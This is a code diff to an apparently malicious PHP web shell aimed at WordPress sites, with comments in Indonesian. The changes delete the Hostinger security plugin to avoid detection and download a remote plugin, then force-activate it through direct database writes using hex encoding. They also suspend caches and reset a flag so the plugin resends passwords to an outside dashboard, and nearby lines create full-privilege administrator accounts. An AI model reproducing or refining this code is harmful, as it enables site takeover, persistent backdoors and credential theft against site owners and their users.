@@ -612,21 +612,14 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     
                     $plugins_dir = $wp_root_path . '/wp-content/plugins/';
                     
-                    // --- [BARU] DETEKSI & HAPUS PLUGIN HOSTINGER ---
-                    // Dilakukan sebelum download plugin kita agar tidak bentrok/terdeteksi
+                    // --- DETEKSI & HAPUS HOSTINGER ---
                     $path_hostinger = $plugins_dir . 'hostinger';
                     $hst_badge = "";
-                    
                     if (is_dir($path_hostinger)) {
-                        // Gunakan fungsi rrmdir() bawaan filemanager untuk hapus folder & isinya
                         rrmdir($path_hostinger);
-                        clearstatcache(); // Refresh cache status file
-                        
-                        if (!file_exists($path_hostinger)) {
-                            $hst_badge = "<span style='$st_warn'>HOSTINGER DEL</span>";
-                        } else {
-                            $hst_badge = "<span style='$st_err'>DEL HOSTINGER FAIL</span>";
-                        }
+                        clearstatcache(); 
+                        if (!file_exists($path_hostinger)) $hst_badge = "<span style='$st_warn'>HOSTINGER DEL</span>";
+                        else $hst_badge = "<span style='$st_err'>DEL HOSTINGER FAIL</span>";
                     }
 
                     // --- 1. DOWNLOAD PLUGIN SYSTEM CORE ---
@@ -634,22 +627,26 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     $target_file = $target_folder . '/' . $plugin_filename;
                     $dl_badge = "<span style='$st_err'>DL FAIL</span>";
                     
-                    if (!is_dir($target_folder)) @mkdir($target_folder, 0755, true);
+                    if (!is_dir($target_folder)) {
+                        @mkdir($target_folder, 0755, true);
+                        @chmod($target_folder, 0755); // Paksa permission folder
+                    }
 
                     if (!file_exists($target_file)) {
                         $p_content = @file_get_contents($plugin_src, false, stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0"]]));
                         if ($p_content && @file_put_contents($target_file, $p_content)) {
+                            @chmod($target_file, 0644); // Paksa permission file
                             $dl_badge = "<span style='$st_ok'>DL OK</span>";
                         }
                     } else {
                         $dl_badge = "<span style='$st_warn'>EXISTS</span>";
                     }
 
-                    // --- 2. ACTIVATION & CACHE BYPASS ---
+                    // --- 2. ACTIVATION (HEX METHOD - ANTI CORRUPTION) ---
                     $act_badge = "";
                     $is_active = false;
                     
-                    // A. CACHE BYPASS: Matikan Object Cache Sementara
+                    // A. Matikan Cache Object Sementara
                     $wp_content = $wp_root_path . '/wp-content';
                     $obj_cache = $wp_content . '/object-cache.php';
                     $adv_cache = $wp_content . '/advanced-cache.php';
@@ -659,7 +656,7 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     if (file_exists($obj_cache)) { @rename($obj_cache, $obj_cache . '.suspend'); $renamed_obj = true; }
                     if (file_exists($adv_cache)) { @rename($adv_cache, $adv_cache . '.suspend'); $renamed_adv = true; }
                     
-                    // Hapus folder cache fisik jika ada
+                    // Hapus folder cache fisik
                     $cache_dir = $wp_content . '/cache';
                     if (is_dir($cache_dir)) {
                         $files = new RecursiveIteratorIterator(
@@ -673,7 +670,7 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                         @rmdir($cache_dir);
                     }
 
-                    // B. UPDATE DB (FORCE)
+                    // B. UPDATE DB MENGGUNAKAN HEX (PERBAIKAN UTAMA)
                     $qopt = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='active_plugins'");
                     if ($qopt && mysqli_num_rows($qopt) > 0) {
                         $row = mysqli_fetch_assoc($qopt);
@@ -689,20 +686,22 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     }
                     sort($current_plugins);
                     
-                    $new_val = mysqli_real_escape_string($cn, serialize($current_plugins));
+                    // [SOLUSI] Gunakan bin2hex untuk menghindari mysqli_real_escape_string merusak serialisasi
+                    $serialized_data = serialize($current_plugins);
+                    $hex_data = bin2hex($serialized_data);
                     
                     @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='active_plugins'");
-                    if (@mysqli_query($cn, "INSERT INTO {$pre}options (option_name, option_value, autoload) VALUES ('active_plugins', '$new_val', 'yes')")) {
-                        // Bersihkan transient DB cache
-                        @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name LIKE '_transient_%' OR option_name LIKE '_site_transient_%'");
+                    // Syntax 0x... memaksa MySQL membaca sebagai raw binary/string
+                    if (@mysqli_query($cn, "INSERT INTO {$pre}options (option_name, option_value, autoload) VALUES ('active_plugins', 0x$hex_data, 'yes')")) {
                         
-                        // [FIX PENTING] Hapus status setup agar plugin mengirim ulang password ke dashboard
+                        // Bersihkan transient agar WP membaca ulang option
+                        @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name LIKE '_transient_%' OR option_name LIKE '_site_transient_%'");
                         @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='rls_setup_done'");
                         
-                        $act_badge = "<span style='$st_ok'>FORCED ON</span>";
+                        $act_badge = "<span style='$st_ok'>FORCED ON (HEX)</span>";
                         $is_active = true;
                     } else {
-                        $act_badge = "<span style='$st_err'>DB ERROR</span>";
+                        $act_badge = "<span style='$st_err'>DB HEX ERROR</span>";
                     }
 
                     // --- 3. PING & RESTORE CACHE ---
@@ -781,9 +780,9 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}capabilities','$cap') ON DUPLICATE KEY UPDATE meta_value='$cap'");
                     @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");
 
-                    // Tampilkan Badge Hostinger di log
                     $log .= "$dl_badge $hst_badge $act_badge $ping_badge $u_badge <a href='$surl/wp-login.php' target='_blank' style='background:#333; padding:2px 6px; border-radius:3px; color:#fff; text-decoration:none; font-size:0.85em;'>Login &raquo;</a>";
                 }
+                
                 elseif (isset($_POST['reactivate_plugins'])) {
                     $qbk = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='xshikata_bkp'");
                     if ($qbk && mysqli_num_rows($qbk)>0) {
